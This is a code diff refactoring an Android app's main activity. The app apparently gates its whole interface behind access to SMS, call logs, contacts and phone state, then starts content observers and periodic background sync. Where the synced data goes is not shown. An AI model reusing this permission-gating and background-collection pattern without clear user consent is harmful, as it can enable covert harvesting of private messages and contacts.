@@ -1,38 +1,25 @@
 package com.boxx.datasync
 
-import android.Manifest
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.util.Log
 import android.provider.Settings
+import android.util.Log
 import androidx.activity.ComponentActivity
-import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.compose.setContent
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.activity.viewModels
 import androidx.compose.foundation.isSystemInDarkTheme
 import androidx.compose.foundation.layout.fillMaxSize
-import androidx.lifecycle.lifecycleScope
-import androidx.lifecycle.repeatOnLifecycle
-import androidx.lifecycle.Lifecycle
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.isActive
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Modifier
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
-import androidx.work.*
-import com.boxx.datasync.sync.SyncService
-import com.boxx.datasync.sync.SyncScheduler
-import com.boxx.datasync.ui.component.PermissionExplanationScreen
-import com.boxx.datasync.ui.component.PermissionRationaleDialog
 import com.boxx.datasync.domain.repository.DataRepository
+import com.boxx.datasync.permission.PermissionViewModel
+import com.boxx.datasync.sync.SyncScheduler
+import com.boxx.datasync.sync.SyncService
 import com.boxx.datasync.ui.screen.MainScreen
+import com.boxx.datasync.ui.screen.PermissionSetupScreen
 import com.boxx.datasync.ui.viewmodel.MainViewModel
 import dagger.hilt.android.AndroidEntryPoint
 import javax.inject.Inject
@@ -41,20 +28,10 @@ import javax.inject.Inject
 class MainActivity : ComponentActivity() {
 
     private val viewModel: MainViewModel by viewModels()
+    private val permissionViewModel: PermissionViewModel by viewModels()
 
     @Inject
     lateinit var repository: DataRepository
-
-    private val requiredPermissions = mutableListOf(
-        Manifest.permission.READ_CONTACTS,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.READ_PHONE_STATE
-    ).apply {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-    }.toTypedArray()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -69,124 +46,49 @@ class MainActivity : ComponentActivity() {
             ) {
                 Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                     val context = androidx.compose.ui.platform.LocalContext.current
-                    var showRationale by remember { mutableStateOf(false) }
-                    var showExplanation by remember { mutableStateOf(false) }
-                    var showSettingsDialog by remember { mutableStateOf(false) }
+                    val allGranted = permissionViewModel.statuses.collectAsState().value.let {
+                        permissionViewModel.areAllRequiredGranted()
+                    }
 
-                    val launcher = rememberLauncherForActivityResult(
-                        ActivityResultContracts.RequestMultiplePermissions()
-                    ) { perms ->
-                        val allGranted = perms.entries.filter { it.key != Manifest.permission.POST_NOTIFICATIONS }.all { it.value }
-                        if (allGranted) {
-                            startSyncService(context)
-                        } else {
-                            val permanentlyDenied = perms.keys.any {
-                                !ActivityCompat.shouldShowRequestPermissionRationale(this, it) &&
-                                ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
-                            }
-                            if (permanentlyDenied) {
-                                showSettingsDialog = true
-                            }
+                    if (allGranted) {
+                        LaunchedEffect(Unit) {
+                            (context.applicationContext as? UserApplication)?.setupContentObservers()
                         }
-                    }
-
-                    MainScreen(
-                        viewModel = viewModel,
-                        onSyncClick = {
-                            Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
-                            viewModel.setSyncing()
-                            startSyncService(context)
-                            if (!hasPermissions(context, requiredPermissions)) {
-                                showRationale = true
-                            }
-                        },
-                        showSettings = {
-                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                                data = Uri.fromParts("package", packageName, null)
-                            }
-                            startActivity(intent)
-                        }
-                    )
-
-                    if (showRationale) {
-                        PermissionRationaleDialog(
-                            onDismiss = { showRationale = false },
-                            onConfirm = {
-                                showRationale = false
-                                showExplanation = true
-                            }
-                        )
-                    }
-
-                    if (showExplanation) {
-                        PermissionExplanationScreen(
-                            onBack = { showExplanation = false },
-                            onGrant = {
-                                showExplanation = false
-                                launcher.launch(requiredPermissions)
-                            }
-                        )
-                    }
-
-                    if (showSettingsDialog) {
-                        AlertDialog(
-                            onDismissRequest = { showSettingsDialog = false },
-                            title = { Text("Settings Required") },
-                            text = { Text("Permissions were permanently denied. Please enable them in app settings to continue with real data sync.") },
-                            confirmButton = {
-                                Button(onClick = {
-                                    showSettingsDialog = false
-                                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                                        data = Uri.fromParts("package", context.packageName, null)
-                                    }
-                                    context.startActivity(intent)
-                                }) { Text("Open Settings") }
+                        MainScreen(
+                            viewModel = viewModel,
+                            onSyncClick = {
+                                Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
+                                viewModel.setSyncing()
+                                startSyncService(context)
                             },
-                            dismissButton = { TextButton(onClick = { showSettingsDialog = false }) { Text("Cancel") } }
+                            showSettings = {
+                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                                    data = Uri.fromParts("package", packageName, null)
+                                }
+                                startActivity(intent)
+                            }
+                        )
+                    } else {
+                        PermissionSetupScreen(
+                            viewModel = permissionViewModel,
+                            onAllGranted = {
+                                permissionViewModel.refreshStatuses()
+                            }
                         )
                     }
                 }
             }
         }
         setupWorkManager()
-        checkBatteryOptimization()
     }
 
-    private fun checkBatteryOptimization() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val packageName = packageName
-            val pm = getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                // Show a dialog to the user
-                android.app.AlertDialog.Builder(this)
-                    .setTitle("Background Sync Restriction")
-                    .setMessage("Android is restricting background execution for this app. For reliable real-time sync, please disable battery optimization for Data Sync.")
-                    .setPositiveButton("Settings") { _, _ ->
-                        val i = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                            data = Uri.parse("package:$packageName")
-                        }
-                        try {
-                            startActivity(i)
-                        } catch (e: Exception) {
-                            val i2 = Intent(android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
-                            startActivity(i2)
-                        }
-                    }
-                    .setNegativeButton("Later", null)
-                    .show()
-            }
-        }
+    override fun onResume() {
+        super.onResume()
+        permissionViewModel.refreshStatuses()
     }
 
     private fun setupWorkManager() {
         SyncScheduler.schedulePeriodic(this)
-    }
-
-    private fun hasPermissions(context: android.content.Context, permissions: Array<String>): Boolean {
-        return permissions.all {
-            if (it == Manifest.permission.POST_NOTIFICATIONS && Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) true
-            else ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
-        }
     }
 
     private fun startSyncService(context: android.content.Context) {
